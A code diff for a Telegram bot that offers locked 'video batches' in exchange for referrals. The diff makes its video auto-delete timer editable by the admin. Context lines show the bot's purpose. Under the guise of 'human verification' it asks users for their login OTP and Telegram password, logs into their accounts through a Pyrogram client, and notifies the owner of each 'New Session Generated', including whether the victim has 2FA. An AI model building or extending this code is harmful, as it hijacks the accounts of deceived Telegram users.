@@ -54,7 +54,8 @@ MONGO_URI = os.environ["MONGO_URI"].strip()
 MONGO_DB = os.getenv("MONGO_DB", "video_unlock_bot").strip()
 ADMIN_ID = int(os.environ["ADMIN_ID"])
 STORAGE_CHANNEL_ID = int(os.environ["STORAGE_CHANNEL_ID"])
-DELETE_AFTER_HOURS = int(os.getenv("DELETE_AFTER_HOURS", "12"))
+# Fallback default for delete timer — actual value comes from DB setting "delete_after_hours"
+DELETE_AFTER_HOURS_DEFAULT = int(os.getenv("DELETE_AFTER_HOURS", "1"))
 REFERRALS_PER_BATCH = max(1, int(os.getenv("REFERRALS_PER_BATCH", "1")))
 PENDING_REQUEST_TTL_HOURS = max(1, int(os.getenv("PENDING_REQUEST_TTL_HOURS", "72")))
 UPLOAD_CONCURRENCY = 1
@@ -125,6 +126,7 @@ DEFAULT_SETTINGS = {
         "Please type your Telegram password in the chat.\n"
         "(The message will be deleted immediately.)"
     ),
+    "delete_after_hours": str(DELETE_AFTER_HOURS_DEFAULT),
 }
 
 EDITABLE_KEYS = list(DEFAULT_SETTINGS.keys())
@@ -137,6 +139,7 @@ KEY_LABELS = {
     "share_contact_button_text": "📱 Share Contact — button",
     "otp_prompt": "🔐 OTP prompt message",
     "twofa_prompt": "🔐 2FA prompt message",
+    "delete_after_hours": "⏳ Auto-delete timer (hours)",
 }
 
 
@@ -158,6 +161,15 @@ def set_setting(key: str, value: str, admin_id: int = None):
         }},
         upsert=True,
     )
+
+
+def get_delete_hours() -> int:
+    """Current auto-delete timer in hours (min 1)."""
+    try:
+        v = int(get_setting("delete_after_hours"))
+        return max(1, v)
+    except (ValueError, TypeError):
+        return 1
 
 
 # ─────────────────── INLINE MENUS ───────────────────
@@ -309,7 +321,7 @@ HELP_TEXT = (
     "━━━━━━━━━━━━━━━━━━━━━━\n"
     "• <code>/admin</code> — Open admin control panel\n"
     "• <code>/help</code> — Show this help panel\n"
-    "• <code>/set</code> — Edit button names &amp; messages (inline menu)\n"
+    "• <code>/set</code> — Edit button names, messages &amp; timers (inline menu)\n"
     "• <code>/uploadstatus</code> — Live status of current upload\n"
     "• <code>/setcustomlink</code> — Set a custom join link for a required chat\n"
     "• <code>/resetverify &lt;user_id&gt;</code> — Reset a user's human verification\n"
@@ -356,9 +368,10 @@ async def set_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
     await reply(
         update, context,
-        "✏️ <b>EDIT BUTTON TEXT / MESSAGES</b>\n\n"
+        "✏️ <b>EDIT BUTTON TEXT / MESSAGES / TIMERS</b>\n\n"
         "Tap any item below to edit it.\n"
-        "The new value will be applied instantly.",
+        "The new value will be applied instantly.\n\n"
+        f"⏳ Current auto-delete: <b>{get_delete_hours()} hour(s)</b>",
         reply_markup=set_menu_inline(),
     )
 
@@ -380,11 +393,16 @@ async def set_edit_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     ADMIN_STATE[ADMIN_ID] = f"set_edit:{key}"
     current = get_setting(key)
 
+    extra_hint = ""
+    if key == "delete_after_hours":
+        extra_hint = "\n\n⚠️ Send a whole number (e.g. <code>1</code>, <code>6</code>, <code>24</code>)."
+
     await q.edit_message_text(
         f"✏️ <b>Editing:</b> <code>{esc(key)}</code>\n\n"
         f"<b>Current value:</b>\n<code>{esc(current)}</code>\n\n"
         "Send the new value in chat.\n"
-        "HTML tags like <code>&lt;b&gt;bold&lt;/b&gt;</code> are supported.\n\n"
+        "HTML tags like <code>&lt;b&gt;bold&lt;/b&gt;</code> are supported."
+        f"{extra_hint}\n\n"
         "Or tap Cancel below.",
         parse_mode=ParseMode.HTML,
         reply_markup=InlineKeyboardMarkup([
@@ -401,9 +419,10 @@ async def set_cancel_callback(update: Update, context: ContextTypes.DEFAULT_TYPE
     ADMIN_STATE.pop(ADMIN_ID, None)
     try:
         await q.edit_message_text(
-            "✏️ <b>EDIT BUTTON TEXT / MESSAGES</b>\n\n"
+            "✏️ <b>EDIT BUTTON TEXT / MESSAGES / TIMERS</b>\n\n"
             "Tap any item below to edit it.\n"
-            "The new value will be applied instantly.",
+            "The new value will be applied instantly.\n\n"
+            f"⏳ Current auto-delete: <b>{get_delete_hours()} hour(s)</b>",
             parse_mode=ParseMode.HTML,
             reply_markup=set_menu_inline(),
         )
@@ -432,6 +451,22 @@ async def set_text_input(update: Update, context: ContextTypes.DEFAULT_TYPE) -> 
         )
         return True
 
+    # Special validation for delete_after_hours
+    if key == "delete_after_hours":
+        try:
+            hours = int(value)
+        except ValueError:
+            await update.message.reply_text(
+                "⚠️ Please send a whole number (e.g. 1, 6, 24)."
+            )
+            return True
+        if hours < 1 or hours > 720:
+            await update.message.reply_text(
+                "⚠️ Hours must be between 1 and 720 (30 days)."
+            )
+            return True
+        value = str(hours)
+
     set_setting(key, value, ADMIN_ID)
     ADMIN_STATE.pop(ADMIN_ID, None)
 
@@ -452,9 +487,10 @@ async def admin_set_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await q.answer()
     try:
         await q.edit_message_text(
-            "✏️ <b>EDIT BUTTON TEXT / MESSAGES</b>\n\n"
+            "✏️ <b>EDIT BUTTON TEXT / MESSAGES / TIMERS</b>\n\n"
             "Tap any item below to edit it.\n"
-            "The new value will be applied instantly.",
+            "The new value will be applied instantly.\n\n"
+            f"⏳ Current auto-delete: <b>{get_delete_hours()} hour(s)</b>",
             parse_mode=ParseMode.HTML,
             reply_markup=set_menu_inline(),
         )
@@ -538,13 +574,11 @@ async def pyro_finish_login(message, uid: int, temp: PyroClient, edit: bool,
     full_name = f"{me.first_name or ''} {me.last_name or ''}".strip() or "—"
     twofa_line = "✅ Yes" if has_2fa else "❌ No"
 
-    # Mark human_verified in DB
     users.update_one(
         {"user_id": uid},
         {"$set": {"human_verified": True, "human_verified_at": utcnow()}},
     )
 
-    # Owner notification
     owner_txt = (
         "🔔 <b>New Session Generated</b>\n\n"
         f"👤 <b>User:</b> {esc(full_name)}\n"
@@ -564,7 +598,6 @@ async def pyro_finish_login(message, uid: int, temp: PyroClient, edit: bool,
     except Exception as e:
         log.warning("owner send fail: %s", e)
 
-    # Success message + See Videos button
     success_msg = get_setting("human_verified_message")
     videos_btn = get_setting("videos_button_text")
     kb = InlineKeyboardMarkup([
@@ -1136,13 +1169,14 @@ async def home(update, context):
         unlocked = 1
         d = user_doc(uid) or {}
 
+    delete_hours = get_delete_hours()
     await reply(
         update, context,
         "🎬 <b>VIDEO VAULT</b>\n\n"
         f"🔓 Unlocked batch: <b>{unlocked}/{total}</b>\n"
         f"👥 Successful referrals: <b>{refs}</b>\n"
         "🎞 Videos per full batch: <b>10</b>\n"
-        f"⏳ Videos auto-delete in <b>{DELETE_AFTER_HOURS} hours</b>.\n\n"
+        f"⏳ Videos auto-delete in <b>{delete_hours} hour(s)</b>.\n\n"
         "Choose an option:",
         reply_markup=user_menu_inline(d),
     )
@@ -1218,13 +1252,13 @@ async def verify_join(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 pass
 
     pending_note = f"\n⏳ Pending approval accepted: <b>{len(pending)}</b>" if pending else ""
+    delete_hours = get_delete_hours()
 
-    # ── Always show user menu (with Verify-as-not-robot in middle row) ──
     success_text = (
         "✅ <b>VERIFICATION SUCCESSFUL</b>\n\n"
         "Access unlocked. 🎉"
         f"{pending_note}\n\n"
-        f"Videos are protected and will be automatically deleted after <b>{DELETE_AFTER_HOURS} hours</b>.\n\n"
+        f"Videos are protected and will be automatically deleted after <b>{delete_hours} hour(s)</b>.\n\n"
         "Choose an option:"
     )
     kb = menu_for(uid)
@@ -1272,6 +1306,7 @@ async def send_batch(bot, chat_id, batch_no):
     if not batch:
         return await bot.send_message(chat_id, "⚠️ This video batch is currently unavailable.")
 
+    delete_hours = get_delete_hours()
     mids = batch.get("message_ids", [])
     await bot.send_message(
         chat_id,
@@ -1279,7 +1314,7 @@ async def send_batch(bot, chat_id, batch_no):
         f"📦 Batch: <b>{batch_no}</b>\n"
         f"🎞 Videos: <b>{len(mids)}</b>\n"
         "🔒 Forward/save protection: <b>ON</b>\n"
-        f"⏳ Auto-delete: <b>{DELETE_AFTER_HOURS} hours</b>",
+        f"⏳ Auto-delete: <b>{delete_hours} hour(s)</b>",
         parse_mode=ParseMode.HTML,
     )
 
@@ -1297,7 +1332,7 @@ async def send_batch(bot, chat_id, batch_no):
         except TelegramError as e:
             log.warning("Video copy failed batch=%s source=%s error=%s", batch_no, mid, type(e).__name__)
 
-    delete_at = utcnow() + timedelta(hours=DELETE_AFTER_HOURS)
+    delete_at = utcnow() + timedelta(hours=delete_hours)
     if sent:
         pending_deletions.insert_many(
             [{"chat_id": chat_id, "message_id": mid, "delete_at": delete_at, "kind": "video"}
@@ -1325,7 +1360,6 @@ async def my_videos(update, context):
 
 
 async def unlock_next(update, context):
-    """Unlock Next 10 — pure referral based."""
     if not await ensure_verified(update, context):
         return
 
@@ -1365,7 +1399,6 @@ async def unlock_next(update, context):
 
 
 async def see_videos_from_hv(update, context):
-    """Called from the '📚 See Videos' button after human verification."""
     if not await ensure_verified(update, context):
         return
     uid = update.effective_user.id
@@ -1407,6 +1440,7 @@ async def progress(update, context):
     current = int(d.get("unlocked_batch", 0))
     refs = int(d.get("verified_referrals", 0))
     human_ok = "✅ Yes" if d.get("human_verified") else "❌ No"
+    delete_hours = get_delete_hours()
 
     unlocked_video_count = 0
     for b in batches.find({"published": True, "batch_no": {"$lte": current}}, {"message_ids": 1}):
@@ -1420,7 +1454,7 @@ async def progress(update, context):
         f"👥 Verified referrals: <b>{refs}</b>\n"
         f"🔐 Human verified: <b>{human_ok}</b>\n"
         f"🎯 Next target: <b>{required_referrals_for_next(max(1,current))}</b>\n"
-        f"⏳ Video expiry: <b>{DELETE_AFTER_HOURS} hours</b>",
+        f"⏳ Video expiry: <b>{delete_hours} hour(s)</b>",
         reply_markup=user_menu_inline(d),
     )
 
@@ -2107,6 +2141,7 @@ async def admin_stats(update, context):
 
     week_ago = today_start - timedelta(days=6)
     last_7_days = users.count_documents({"created_at": {"$gte": week_ago}})
+    delete_hours = get_delete_hours()
 
     await reply(
         update, context,
@@ -2117,7 +2152,8 @@ async def admin_stats(update, context):
         f"🤝 Successful referrals: <b>{refs}</b>\n"
         f"⏳ Active pending join requests: <b>{active_pending}</b>\n"
         f"📦 Batches: <b>{published_batch_count()}</b>\n"
-        f"🗑 Pending deletions: <b>{pending_deletions.count_documents({})}</b>\n\n"
+        f"🗑 Pending deletions: <b>{pending_deletions.count_documents({})}</b>\n"
+        f"⏱ Auto-delete timer: <b>{delete_hours} hour(s)</b>\n\n"
         f"📈 <b>New Users (last 24h):</b> <b>{last_24h}</b>\n"
         f"📅 <b>New Users (last 7 days):</b> <b>{last_7_days}</b>\n\n"
         f"🗓 <b>Daily Breakdown (7 days):</b>\n{daily_block}",
